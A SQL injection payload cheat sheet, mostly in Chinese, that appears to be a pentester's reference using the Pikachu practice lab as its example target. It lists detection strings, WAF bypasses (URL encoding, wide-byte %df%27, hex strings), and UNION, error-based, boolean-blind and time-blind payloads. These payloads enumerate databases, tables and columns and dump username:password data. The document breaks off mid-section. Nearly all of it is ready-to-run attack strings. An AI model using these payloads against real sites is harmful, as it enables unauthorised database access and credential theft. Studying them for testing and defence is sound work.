SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

一些常用的函数

```
SUBSTR(string, 1, 2) # 从首个字符开始截取两个字符
LIMIT 0, 2              # 从首行开始截取两行
```

## 1. Entry point

只要与数据库进行交互就可能存在 SQLi

```
GET: /test?id=payload
POST: username=payload
Cookie: uid=payload
```

> 有时 SQLi 需要末尾添加注释符 `-- ` 才能执行, 其中仅用于 MySQL 有另一个注释符 `#` ;
>
> 需要闭合 `''` , `""` 和 `()` ; 注意语法要符合 `Types` .

> 使用 Burp 测试必须将 Request Body 中的特殊符号进行 URL 编码

## 2. Detection

检测是否存在 SQLi, 并判断闭合方式

这里推荐使用 [SQLi Query Tampering](https://portswigger.net/bappstore/86549d1076bd485aa84c2c2685bd9ffd) 生成 Payload

### 2.1. Error

传入特殊字符触发报错, 添加注释符后正常

```
 
'
"
)
')
")
;
*
\
%CA%BA
%CA%B9
```

常见的 Bypass 有 URL 编码和双重 URL 编码

> 其中 `%CA%BA` 和 `%CA%B9` 为 `U+02BA` 和 `U+02B9` 的 URL 编码, 可能被误判为 `U+0022` 和 `U+0027` 从而实现注入

### 2.2. Bool

使用恒等条件判断, 若为 `true` 则返回数据, 若为 `false` 则没有数据

> 可用于判断闭合方式

```
 OR 1=1       # true
 || 1=1       # true
 AND 1=2      # false
 && 1=2       # false
 OR 1=1 --    # true
 || 1=1 --    # true
 AND 1=2 --   # false
 &&  1=2 --   # false
' OR 1=1      # true
' || 1=1      # true
' AND 1=2     # false
' && 1=2      # false
' OR 1=1 --   # true
' || 1=1 --   # true
' AND 1=2 --  # false
' && 1=2 --   # false
" OR 1=1      # true
" || 1=1      # true
" AND 1=2     # false
" && 1=2      # false
" OR 1=1 --   # true
" || 1=1 --   # true
" AND 1=2 --  # false
" && 1=2 --   # false
) OR 1=1      # true
) || 1=1      # true
) AND 1=2     # false
) && 1=2      # false
) OR 1=1 --   # true
) || 1=1 --   # true
) AND 1=2 --  # false
) && 1=2 --   # false
') OR 1=1     # true
') || 1=1     # true
') AND 1=2    # false
') && 1=2     # false
') OR 1=1 --  # true
') || 1=1 --  # true
') AND 1=2 -- # false
') && 1=2 --  # false
") OR 1=1     # true
") || 1=1     # true
") AND 1=2    # false
") && 1=2     # false
") OR 1=1 --  # true
") || 1=1 --  # true
") AND 1=2 -- # false
") && 1=2 --  # false
```

> 注意添加注释符时需要闭合 `''` , `""` 和 `()` 

可通过 Merging characters 来 Bypass

```
`+HERP
'||'HERP
'+'HERP
' 'HERP
'%20'HERP
'%2B'HERP
```

### 2.3. Time

通过是否执行延时命令判断

```
' AND SLEEP(3) --+ # MySQL
' AND IF(NOW()=SYSDATE(), SLEEP(3), 0) --+ # MySQL
' XOR (IF(NOW() = SYSDATE(), SLEEP(3), 0)) XOR 'Z # MySQL
' AND IF(SUBSTR(@@VERSION, 1, 1) = '5', SLEEP(3), 0) --+ # MySQL

' WAITFOR DELAY '00:00:05' --+ # MSSQL

'; SELECT CASE WHEN (1=1) THEN PG_SLEEP(3) ELSE PG_SLEEP(0) END --+ # PostgreSQL

' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(3) ELSE 1 END FROM DUAL)--+ # Oracle
```

使用 URL 编码避免报错

## 3. DBMS

### 3.1. MySQL

支持十六进制编码, `table_schema='dvwa'` 可修改为 `table_schema=0x64767761` 以绕过对 `''` 和 `""` 的转义

元数据库 `information_schema` 

- 数据表 `tables` 存储了所有数据库中的所有表的信息

  > 字段 `table_schema` 存储数据库名
  >
  > 字段 `table_name` 存储该数据库下的表名

- 数据表 `columns` 存储了所有的数据表和字段的关系

  > 字段 `table_schema` 存储数据库名  
  >
  > 字段 `table_name` 存储表名  
  >
  > 字段 `column_name` 存储对应表中的字段名

## 4. Types

### 4.1. SELECT

基于 SELECT 的 SQL 语句

```
SELECT * FROM users WHERE id = 1;
SELECT * FROM users WHERE id = '1';
SELECT * FROM users WHERE id = "1";
SELECT * FROM users WHERE id = (1);
SELECT * FROM users WHERE id = ('1');
SELECT * FROM users WHERE id = ("1");
SELECT * FROM users WHERE id = '%1%';
SELECT * FROM users WHERE id = "%1%";
```

### 4.2.  INSERT/UPDATE/DELETE

基于 INSERT/UPDATE 或 DELETE 的 SQL 语句

```
INSERT INTO users (uname) VALUES ('1');
INSERT INTO users (uname) VALUES ("1");
UPDATE users SET uname = '1' WHERE id = 1;
UPDATE users SET uname = "1" WHERE id = 1;
DELETE FROM users WHERE uname = '1';
DELETE FROM users WHERE uname = "1";
```

### 4.3. HTTP Header

HTTP Header 中的任何数据都可能存在注入点, 如 User-Agent, Cookie 的值;

一般使用 INSERT 或 UPDATE, 无需在 Burp 中使用 URL 编码

### 4.4. Wide-Byte

用户传入的数据为窄字节如: UTF-8, 而 WAF 将接收到的转换为宽字节如:GBK 并进行拦截;

`%27` 在 UTF-8 和 GBK 中都是代表 `'` , 而 `%df%27` 则会在 GBK 中则会被识别为汉字绕过拦截;

因此使用 `%df%27` 在 Burp 中代替 `%27` 即可.

## 5. UNION

> 主要用于 SELECT

### 5.1 Column count

利用 ORDER BY 判断有几个字段

```
' ORDER BY 3 -- 
```

> 当写入 3 个字段时报错，说明有 2 个字段;
>
> 可尝试二分法.

> 在某些情况下 ORDER BY 无效但是 SELECT 依然有效

### 5.1. Location

判断回显的位置

```
' UNION SELECT NULL, NULL -- 
```

> 查询字段数量必须与 `Column count` 相同
>
> 使用 `NULL` 是因为某些字段限制为字符型或数字型, 而 `NULL` 通用

### 5.2. Database

在有回显的位置显示所有数据库名

```
' UNION SELECT (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.TABLES), NULL -- 
```

在有回显的位置显示当前数据库名

```
' UNION SELECT DATABASE(), NULL -- 
```

### 5.3. Tables

显示指定数据库的所有数据表名

```
' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.TABLES WHERE table_schema='pikachu'), NULL -- 
```

显示当前数据库的所有数据表名

```
' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.TABLES WHERE table_schema=DATABASE()), NULL -- 
```

### 5.4. Columns

显示指定数据库中指定数据表的所有字段名

```
' UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users'), NULL -- 
```

显示当前数据库中指定数据表的所有字段名

```
' UNION SELECT (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users'), NULL -- 
```

### 5.5. Dump

显示指定数据库中指定数据表中指定字段的所有数据

```
' UNION SELECT (SELECT GROUP_CONCAT(username, 0x3A, password) FROM pikachu.users), NULL -- 
```

显示当前数据库中指定数据表中指定字段的所有数据

```
' UNION SELECT (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), NULL -- 
```

## 6. Error

> 主要用于  INSERT/UPDATE 或 DELETE

以下示例用的是字符型

```
' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0) OR '
```

若是数字型要改为

```
 OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0)
```

### 6.1. Location

判断是否有回显

```
' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, USER(), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, USER(), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

### 6.2. Database

显示数据库的个数

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.SCHEMATA), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.SCHEMATA), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.SCHEMATA), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

显示第一个数据库名的字节长度

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT LENGTH(schema_name) FROM information_schema.SCHEMATA LIMIT 0, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT LENGTH(schema_name) FROM information_schema.SCHEMATA LIMIT 0, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT LENGTH(schema_name) FROM information_schema.SCHEMATA LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

显示第一个数据库名的第一个字符

```
' OR UPDATEXML(1, CONCAT(0x7e, (SUBSTR((SELECT schema_name FROM information_schema.SCHEMATA LIMIT 0, 1), 1, 1)), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SUBSTR((SELECT schema_name FROM information_schema.SCHEMATA LIMIT 0, 1), 1, 1)), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SUBSTR((SELECT schema_name FROM information_schema.SCHEMATA LIMIT 0, 1), 1, 1)), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

显示当前数据库名的字节长度

```
' OR UPDATEXML(1, CONCAT(0x7e, LENGTH(DATABASE()), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, LENGTH(DATABASE()), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, LENGTH(DATABASE()), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

显示当前数据库名的第一个字符

```
' OR UPDATEXML(1, CONCAT(0x7e, SUBSTR(DATABASE(), 1, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, SUBSTR(DATABASE(), 1, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, SUBSTR(DATABASE(), 1, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

### 6.3. Tables

显示指定数据库中数据表的个数

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema='pikachu'), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema='pikachu'), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema='pikachu'), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

显示当前数据库中数据表的个数

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema=DATABASE()), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema=DATABASE()), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema=DATABASE()), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

显示指定数据库中第一个数据表名的字节长度

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

显示当前数据库中第一个数据表名的字节长度

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

显示指定数据库中第一个数据表名的第一个字符

```
' OR UPDATEXML(1, CONCAT(0x7e, SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 1, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 1, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 1, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

显示当前数据库中第一个数据表名的第一个字符

```
' OR UPDATEXML(1, CONCAT(0x7e, SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 1, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 1, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 1, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

### 6.4. Columns

判断指定数据库中指定数据表中字段的个数

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema='pikachu' and table_name='users'), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema='pikachu' and table_name='users'), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema='pikachu' and table_name='users'), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

判断当前数据库中指定数据表中字段的个数

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() and table_name='users'), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() and table_name='users'), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() and table_name='users'), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

判断指定数据库中指定数据表中第一个字段名的字节长度

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

判断当前数据库中指定数据表中第一个字段名的字节长度

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

判断指定数据库中指定数据表中第一个字段名的第一个字符

```
' OR UPDATEXML(1, CONCAT(0x7e, SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1), 1, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1), 1, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1), 1, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

判断当前数据库中指定数据表中第一个字段名的第一个字符

```
' OR UPDATEXML(1, CONCAT(0x7e, SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1), 1, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1), 1, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1), 1, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

### 6.5. Dump

判断指定数据库中指定数据表中指定字段中数据的个数

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT COUNT(*) FROM pikachu.users), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT COUNT(*) FROM pikachu.users), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT COUNT(*) FROM pikachu.users), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

判断当前数据库中指定数据表中指定字段中数据的个数

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT COUNT(*) FROM users), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT COUNT(*) FROM users), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT COUNT(*) FROM users), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

判断指定数据库中指定数据表中第一个字段中第一个数据的字节长度

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT LENGTH(username) FROM pikachu.users LIMIT 0, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT LENGTH(username) FROM pikachu.users LIMIT 0, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT LENGTH(username) FROM pikachu.users LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

判断当前数据库中指定数据表中第一个字段中第一个数据的字节长度

```
' OR UPDATEXML(1, CONCAT(0x7e, (SELECT LENGTH(username) FROM users LIMIT 0, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT LENGTH(username) FROM users LIMIT 0, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT LENGTH(username) FROM users LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

判断指定数据库中指定数据表中第一个字段中第一个数据的第一个字符

```
' OR UPDATEXML(1, CONCAT(0x7e, SUBSTR((SELECT username FROM pikachu.users LIMIT 0, 1), 1, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, SUBSTR((SELECT username FROM pikachu.users LIMIT 0, 1), 1, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, SUBSTR((SELECT username FROM pikachu.users LIMIT 0, 1), 1, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

判断当前数据库中指定数据表中第一个字段中第一个数据的第一个字符

```
' OR UPDATEXML(1, CONCAT(0x7e, SUBSTR((SELECT username FROM users LIMIT 0, 1), 1, 1), 0x7e), 0) OR '
```

```
' OR EXTRACTVALUE(1, CONCAT(0x7e, SUBSTR((SELECT username FROM users LIMIT 0, 1), 1, 1), 0x7e)) OR '
```

```
' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, SUBSTR((SELECT username FROM users LIMIT 0, 1), 1, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
```

## 7. Bool

> 通用

### 7.1. Probe

探测布尔盲注是否可用

```
' AND (LENGTH(USER()) > 1) -- # true
```

```
' AND (LENGTH(USER()) < 1) -- # false
```

```
' AND (LENGTH(USER()) = 14) -- # true
```

> 当长度为 14 时返回为真，说明有 14 个字节;
>
> 可尝试二分法.

### 7.2. Database

判断数据库的个数

```
' AND (SELECT COUNT(*) FROM information_schema.SCHEMATA) = 5 -- 
```

判断第一个数据库名的字节长度

```
' AND (SELECT LENGTH(schema_name) FROM information_schema.SCHEMATA LIMIT 0, 1) = 18 -- 
```

判断第一个数据库名的第一个字符

```
' AND ASCII (SUBSTR((SELECT schema_name FROM information_schema.SCHEMATA LIMIT 0, 1), 1, 1)) = 105 -- 
```

判断当前数据库名的字节长度

```
' AND (LENGTH(DATABASE()) = 7) -- 
```

判断当前数据库名的第一个字符

```
' AND ASCII (SUBSTR(DATABASE(), 1, 1)) = 112 -- 
```

> 使用 `ASCII()` 将提取到的字符转换为 ASCII 码

### 7.2. Tables

判断指定数据库中数据表的个数

```
' AND (SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema='pikachu') = 5 -- 
```

判断当前数据库中数据表的个数

```
' AND (SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema=DATABASE()) = 5 -- 
```

> 当 `information_schema` 被过滤时可使用 `sys.schema` 

判断指定数据库中第一个数据表名的字节长度

```
' AND (SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1) = 8 -- 
```

判断当前数据库中第一个数据表名的字节长度

```
' AND (SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1) = 8 -- 
```

判断指定数据库中第一个数据表名的第一个字符

```
' AND ASCII (SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 1, 1)) = 104 -- 
```

判断当前数据库中第一个数据表名的第一个字符

```
' AND ASCII (SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 1, 1)) = 104 -- 
```

### 7.3. Columns

判断指定数据库中指定数据表中字段的个数

```
' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema='pikachu' and table_name='users') = 4 -- 
```

判断当前数据库中指定数据表中字段的个数

```
' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() and table_name='users') = 4 -- 
```

判断指定数据库中指定数据表中第一个字段名的字节长度

```
' AND (SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1) = 2 -- 
```

判断当前数据库中指定数据表中第一个字段名的字节长度

```
' AND (SELECT LENGTH(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1) = 2 -- 
```

判断指定数据库中指定数据表中第一个字段名的第一个字符

```
' AND ASCII (SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users' LIMIT 0, 1), 1, 1)) = 105 -- 
```

判断当前数据库中指定数据表中第一个字段名的第一个字符

```
' AND ASCII (SUBSTR((SELECT column_name FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users' LIMIT 0, 1), 1, 1)) = 105 -- 
```

### 7.5. Dump

判断指定数据库中指定数据表中指定字段中数据的个数

```
' AND (SELECT COUNT(*) FROM pikachu.users) = 3 -- 
```

判断当前数据库中指定数据表中指定字段中数据的个数

```
' AND (SELECT COUNT(*) FROM users) = 3 -- 
```

判断指定数据库中指定数据表中第一个字段中第一个数据的字节长度

```
' AND (SELECT LENGTH(username) FROM pikachu.users LIMIT 0, 1) = 5 -- 
```

判断当前数据库中指定数据表中第一个字段中第一个数据的字节长度

```
' AND (SELECT LENGTH(username) FROM users LIMIT 0, 1) = 5 -- 
```

判断指定数据库中指定数据表中第一个字段中第一个数据的第一个字符

```
' AND ASCII (SUBSTR((SELECT username FROM pikachu.users LIMIT 0, 1), 1, 1)) = 97 -- 
```

判断当前数据库中指定数据表中第一个字段中第一个数据的第一个字符

```
' AND ASCII (SUBSTR((SELECT username FROM users LIMIT 0, 1), 1, 1)) = 97 -- 
```

## 8. Time

> 通用

### 8.1. Probe

探测时间盲注是否可用

```
' AND SLEEP(3) -- 
```

### 8.2. Database

判断数据库的个数

```
' AND IF((SELECT COUNT(*) FROM information_schema.SCHEMATA) = 5, SLEEP(3), 1) -- 
```

判断第一个数据库名的字节长度

```
' AND IF((SELECT LENGTH(schema_name) FROM information_schema.SCHEMATA LIMIT 0, 1) = 18, SLEEP(3), 1) -- 
```

判断第一个数据库名的第一个字符

```
' AND IF(ASCII (SUBSTR((SELECT schema_name FROM information_schema.SCHEMATA LIMIT 0, 1), 1, 1)) = 105, SLEEP(3), 1) -- 
```

判断当前数据库名的字节长度

```
' AND IF(LENGTH(DATABASE()) = 7, SLEEP(3), 1) -- 
```

判断当前数据库名的第一个字符

```
' AND IF(ASCII(SUBSTR(DATABASE(), 1, 1)) = 112, SLEEP(3), 1) -- 
```

> 使用 `ASCII()` 将提取到的字符转换为 ASCII 码

### 8.2. Tables

判断指定数据库中数据表的个数

```
' AND IF((SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema='pikachu') = 5, SLEEP(3), 1) -- 
```

判断当前数据库中数据表的个数

```
' AND IF((SELECT COUNT(*) FROM information_schema.TABLES WHERE table_schema=DATABASE()) = 5, SLEEP(3), 1) -- 
```

> 当 `information_schema` 被过滤时可使用 `sys.schema` 

判断指定数据库中第一个数据表名的字节长度

```
' AND IF((SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1) = 8, SLEEP(3), 1) -- 
```

判断当前数据库中第一个数据表名的字节长度

```
' AND IF((SELECT LENGTH(table_name) FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1) = 8, SLEEP(3), 1) -- 
```

判断指定数据库中第一个数据表名的第一个字符

```
' AND IF(ASCII (SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 1, 1)) = 104, SLEEP(3), 1) -- 
```

判断当前数据库中第一个数据表名的第一个字符

```
' AND IF(ASCII (SUBSTR((SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 1, 1)) = 104, SLEEP(3), 1) -- 
```

### 8.3. Columns

判断指定数据库中指定数据表中字段的个数

```
' AND IF((SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema='pikachu' and table_name='users') = 4, SLEEP(3), 1) -- 
```

判断当前数据库中指定数据表中字段的个数

```
' AND IF((SELECT COUNT(*) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() and table_name='users') = 4, SLEEP(3), 1) -- 
```

判断指定数据库中指定数据表中第一个字段名的字节长度

```
